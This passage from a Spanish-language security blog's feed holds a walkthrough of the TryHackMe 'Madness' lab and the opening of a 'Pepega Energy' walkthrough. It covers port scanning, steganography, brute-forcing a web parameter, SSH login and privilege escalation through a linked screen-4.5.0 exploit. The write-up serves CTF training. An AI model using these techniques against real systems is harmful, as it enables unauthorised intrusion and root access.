&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Thu Feb  6 19:01:14 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.53.61&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.53.61
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65533&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Feb  6 19:16:00 2020 -- 1 IP address (1 host up) scanned in 886.81 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos la pagina principal de Apache en el puerto http (80).&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/madness/Screenshot_20200206_192058.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el codigo fuente de la pagina encontramos una image la cual no se muestra en la pagina y al visitarla no se logra visualizar.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/madness/Screenshot_20200206_192214.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Descargamos la imagen y al ver el tipo de archivo nos muestra lo siguiente:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/madness# xxd thm.jpg &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;head
00000000: &lt;span class=&#34;m&#34;&gt;8950&lt;/span&gt; 4e47 0d0a 1a0a &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0001&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0100&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0001&lt;/span&gt;  .PNG............
00000010: &lt;span class=&#34;m&#34;&gt;0001&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; ffdb &lt;span class=&#34;m&#34;&gt;0043&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0003&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0202&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0302&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0203&lt;/span&gt;  .......C........
00000020: &lt;span class=&#34;m&#34;&gt;0303&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0304&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0303&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0405&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0805&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0504&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0405&lt;/span&gt; 0a07  ................
00000030: &lt;span class=&#34;m&#34;&gt;0706&lt;/span&gt; 080c 0a0c 0c0b 0a0b 0b0d 0e12 100d  ................
00000040: 0e11 0e0b 0b10 &lt;span class=&#34;m&#34;&gt;1610&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1113&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1415&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1515&lt;/span&gt; 0c0f  ................
00000050: &lt;span class=&#34;m&#34;&gt;1718&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1614&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1812&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1415&lt;/span&gt; 14ff db00 &lt;span class=&#34;m&#34;&gt;4301&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0304&lt;/span&gt;  ............C...
00000060: &lt;span class=&#34;m&#34;&gt;0405&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0405&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0905&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0509&lt;/span&gt; 140d 0b0d &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt;  ................
00000070: &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt;  ................
00000080: &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt;  ................
00000090: &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1414&lt;/span&gt; ffc0  ................
root@aoiri:~/tryhackme/madness# file thm.jpg 
thm.jpg: data
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos que los &lt;strong&gt;magic numbers&lt;/strong&gt; pertenecen a PNG cuando el archivo esta con extencion JPG, utilizamos xxd para obtener la imagen en hexadecimal, luego de eso con vim editamos el archivo&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;FF D8 FF E0 00 10 4A 46 49 46 00 01
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/madness# xxd -p thm.jpg &amp;gt; hexthm
root@aoiri:~/tryhackme/madness# vim hexthm
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Remplazamos exactamente la misma cantidad de valores en hex de JPG.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Antes:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;89504e470d0a1a0a000000010100000100010000ffdb0043000302020302
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Despues:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;FFD8FFE000104A46494600010100000100010000ffdb0043000302020302
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Utilizamos CyberChef para renderizar nuestra imagen:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/madness/Screenshot_20200206_195310.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;La imagen nos muestra una direccion, al visitarla en la pagina encontramos lo siguiente:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/madness/Screenshot_20200206_195445.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El codigo fuente nos muestra un comentario:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/madness/Screenshot_20200206_195756.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos GOBUSTER para buscar archivos o directorios en el directorio:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/madness# gobuster dir -u http://10.10.53.61/th1s_1s_h1dd3n/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x php,html,txt
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;A la pagina index le pasamos al parametro secret un numero, al hacer esto se muestra el numero:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/madness/Screenshot_20200206_200219.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;burpsuite&#34;&gt;BURPSUITE&lt;/h3&gt;
&lt;p&gt;Utilizamos burpsuite para poder obtener el numero correcto que se encuentra entre 0-99 como lo menciona el comentario que encontramos en la pagina.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/madness/Screenshot_20200206_201222.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos con el numero &lt;strong&gt;7+&lt;/strong&gt; un mensaje distinto.&lt;/p&gt;
&lt;h3 id=&#34;stego&#34;&gt;STEGO&lt;/h3&gt;
&lt;p&gt;Con la imagen que modificamos, utilizamos steghide y con la frase que nos muestra la pagina. Nos muestra el usuario e indica que ya tenemos la contraseña.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/madness# steghide extract -sf imagen.jpg 
Enter passphrase: 
wrote extracted data to &lt;span class=&#34;s2&#34;&gt;&amp;#34;hidden.txt&amp;#34;&lt;/span&gt;.
root@aoiri:~/tryhackme/madness# cat hidden.txt 
Fine you found the password! 

Here&lt;span class=&#34;s1&#34;&gt;&amp;#39;s a username 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;wbxre
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;I didn&amp;#39;&lt;/span&gt;t say I would make it easy &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; you!
root@aoiri:~/tryhackme/madness#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Intentamos utilizar las credenciales en el servicio SSH pero no funcionó, por lo que utilizamos nuevamente cyberchef para poder &amp;ldquo;decodificar&amp;rdquo; el usuario.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,13)&amp;amp;input=d2J4cmU&#34;&gt;&lt;strong&gt;joker&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos steghide para extraer los datos de la imagen de portada de la maquina (no requiere contraseña):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/madness# steghide extract -sf 5iW7kC8.jpg
Enter passphrase: 
wrote extracted data to &lt;span class=&#34;s2&#34;&gt;&amp;#34;password.txt&amp;#34;&lt;/span&gt;.
root@aoiri:~/tryhackme/madness# password.txt 
I didn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t think you&amp;#39;&lt;/span&gt;d find me! Congratulations!

Here take my password

*ax&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;P
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ssh---user&#34;&gt;SSH - USER&lt;/h2&gt;
&lt;p&gt;Utilizamos las credenciales que encontramos en el servicio SSH, obtenemos nuestra shell y nuestra flat &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/madness/Screenshot_20200206_203031.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Buscamos por archivos SUID en la maquina, encontramos &lt;strong&gt;screen-4.5.0&lt;/strong&gt;, al realizar la busqueda en exploitdb encontramos un exploit que puede ayudarnos a escalar privilegios.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;joker@ubuntu:~$ find / -perm -g&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;s -o -perm -u&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;s -type f 2&amp;gt;/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/mlocate
/usr/bin/chage
/usr/bin/crontab
/usr/bin/ssh-agent
/usr/bin/wall
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/expiry
/usr/bin/chsh
/usr/bin/bsd-write
/usr/bin/chfn
/usr/bin/sudo
/usr/local/share/emacs
/usr/local/share/emacs/site-lisp
/usr/local/share/xml
/usr/local/share/xml/schema
/usr/local/share/xml/misc
/usr/local/share/xml/declaration
/usr/local/share/xml/entities
/usr/local/share/sgml
/usr/local/share/sgml/misc
/usr/local/share/sgml/declaration
/usr/local/share/sgml/stylesheet
/usr/local/share/sgml/entities
/usr/local/share/sgml/dtd
/usr/local/share/fonts
/usr/local/lib/python3.5
/usr/local/lib/python3.5/dist-packages
/bin/fusermount
/bin/su
/bin/ping6
/bin/screen-4.5.0
/bin/screen-4.5.0.old
/bin/mount
/bin/ping
/bin/umount
/sbin/unix_chkpwd
/sbin/pam_extrausers_chkpwd
/var/cache/man
/var/mail
/var/local
/run/log/journal
/run/log/journal/2e1e8ccd62e8ef3b80d3aeab5e10fee0
joker@ubuntu:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/41154&#34;&gt;&lt;strong&gt;screen-4.5.0&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos el exploit en la maquina, obtenemos una shell con usuario root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/madness/Screenshot_20200206_203658.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/madness/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/madness/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Pepega Energy</title>
        <link>https://sckull.github.io/posts/pepegaenergy/</link>
        <pubDate>Wed, 12 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 12 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/pepegaenergy/</guid>
        <description>Pepega Energy es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Pepega Energy es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/pepegaenergy/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Pepega Energy&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;A new startup has asked for a security audit: turns out there&amp;rsquo;s only one laptop.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;1642&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/SherlockSec&#34;&gt;SherlockSec&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp, nmap nos muestra varios puertos abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
